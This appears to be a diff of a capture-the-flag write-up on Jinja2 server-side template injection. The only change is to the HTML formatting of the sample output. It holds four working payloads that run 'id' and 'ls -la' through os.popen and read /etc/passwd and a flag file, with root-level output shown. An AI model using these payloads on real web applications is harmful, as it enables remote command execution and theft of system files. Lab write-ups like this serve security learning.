@@ -80,55 +80,49 @@ Step 3: Try to execute some commands.
 i) {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 	
     <!doctype html>
-    <html>
-        <h1 style="font-size:100px;" align="center">
-            uid=0(root) gid=0(root) groups=0(root)
-	    </h1>
-	</html
+    <h1 style="font-size:100px;" align="center">
+        uid=0(root) gid=0(root) groups=0(root)
+	</h1>
 	  
 	  
 ii) {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
 	
 	
     <!doctype html>
-    <html>
-        <h1 style="font-size:100px;" align="center">
-            root:x:0:0:root:/root:/bin/bash
-			daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-			bin:x:2:2:bin:/bin:/usr/sbin/nologin
-			sys:x:3:3:sys:/dev:/usr/sbin/nologin
-			sync:x:4:65534:sync:/bin:/bin/sync
-			games:x:5:60:games:/usr/games:/usr/sbin/nologin
-			man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-			lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-			mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-			news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-			uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-			proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-			www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-			backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-			list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-			irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-			gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-			nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-			_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-	    </h1>
-	</html>
+    <h1 style="font-size:100px;" align="center">
+        root:x:0:0:root:/root:/bin/bash
+		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+		bin:x:2:2:bin:/bin:/usr/sbin/nologin
+		sys:x:3:3:sys:/dev:/usr/sbin/nologin
+		sync:x:4:65534:sync:/bin:/bin/sync
+		games:x:5:60:games:/usr/games:/usr/sbin/nologin
+		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+		lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+		mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+		news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+		uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+		proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+		backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+		list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+		irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+		gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+		nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+		_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+	</h1>
 	   
 	   
 iii) {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('ls -la').read() }}
  	
     <!doctype html>
-    <html>
-        <h1 style="font-size:100px;" align="center">
-			drwxr-xr-x 1 root root   25 May 20 00:34 .
-			drwxr-xr-x 1 root root   23 May 20 00:34 ..
-			drwxr-xr-x 2 root root   32 May 20 00:34 __pycache__
-			-rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py
-			-rw-r--r-- 1 root root   58 Mar  6 19:44 flag    <!-------------- we got the flag --------------->
-			-rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt
-	    </h1>
-	</html>
+    <h1 style="font-size:100px;" align="center">
+		drwxr-xr-x 1 root root   25 May 20 00:34 .
+		drwxr-xr-x 1 root root   23 May 20 00:34 ..
+		drwxr-xr-x 2 root root   32 May 20 00:34 __pycache__
+		-rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py
+		-rw-r--r-- 1 root root   58 Mar  6 19:44 flag    <!-------------- we got the flag --------------->
+		-rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt
+	</h1>
 
 
 iv) {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('flag').read() }}
